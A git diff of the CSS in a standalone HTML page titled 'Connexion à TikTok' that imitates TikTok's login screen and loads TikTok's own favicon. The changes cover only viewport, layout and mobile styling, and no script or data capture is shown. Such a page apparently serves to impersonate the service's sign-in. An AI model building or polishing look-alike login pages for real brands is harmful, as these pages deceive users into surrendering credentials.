@@ -4,22 +4,23 @@
   <meta charset="UTF-8">
   <title>Connexion à TikTok</title>
   <link rel="icon" href="https://www.tiktok.com/favicon.ico">  
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
   <style>
     * {
       box-sizing: border-box;
     }
 
-    body {
+    html, body {
       margin: 0;
-      background-color: #fafafa;
+      padding: 0;
       font-family: 'Inter', sans-serif;
+      background-color: #fafafa;
+      height: 100dvh; 
+      width: 100%;
       display: flex;
       justify-content: center;
       align-items: center;
-      height: 100vh;
-      padding: 16px;
     }
 
     .container {
@@ -28,8 +29,8 @@
       border-radius: 12px;
       width: 100%;
       max-width: 420px;
-      box-shadow: 0 0 0 rgba(0, 0, 0, 0);
       text-align: center;
+      box-shadow: 0 0 0 rgba(0, 0, 0, 0);
     }
 
     .logo {
@@ -84,7 +85,6 @@
       display: none;
     }
 
-    /* 🔁 RESPONSIVE MOBILE */
     @media (max-width: 480px) {
       .container {
         padding: 32px 20px;
